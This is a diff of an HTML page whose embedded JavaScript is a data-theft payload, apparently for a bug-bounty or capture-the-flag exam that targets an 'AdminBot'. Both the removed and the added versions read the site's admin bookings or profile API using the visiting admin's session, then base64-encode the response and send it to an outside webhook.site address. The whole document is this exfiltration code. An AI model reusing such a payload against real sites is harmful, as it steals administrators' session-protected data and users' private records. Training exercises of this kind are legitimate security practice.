@@ -3,28 +3,20 @@
 <body>
     <script>
         const webh = "https://webhook.site/91bce232-92d8-4ee3-bf77-38a155638aae";
-        const base = "https://api-bugbounty-exam.hashacademy.co";
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/admin/bookings";
 
-        async function steal() {
-            // Target the list of ALL bookings - the flag is usually in a specific record here
-            const response = await fetch(base + "/api/admin/bookings", { credentials: "include" });
-            const data = await response.json();
-            
-            // Encode the entire JSON to Base64 to safely transmit it via URL
-            const encodedData = btoa(JSON.stringify(data));
-            
-            // Redirect the AdminBot to your webhook with the data
-            window.location.href = webh + "?full_leak=" + encodedData;
-        }
-
-        steal().catch(err => {
-            // If the first one fails, try the admin profile
-            fetch(base + "/api/auth/profile", { credentials: "include" })
-                .then(r => r.text())
-                .then(d => {
-                    window.location.href = webh + "?profile_leak=" + btoa(d);
-                });
-        });
+        // Open the API in a hidden way and leak the content
+        const win = window.open(target, "_blank");
+        
+        setTimeout(() => {
+            try {
+                const data = win.document.body.innerText;
+                window.location.href = webh + "?d=" + btoa(data);
+            } catch (e) {
+                // If window.open is blocked, try a direct link redirect
+                window.location.href = target; 
+            }
+        }, 2000);
     </script>
 </body>
 </html>
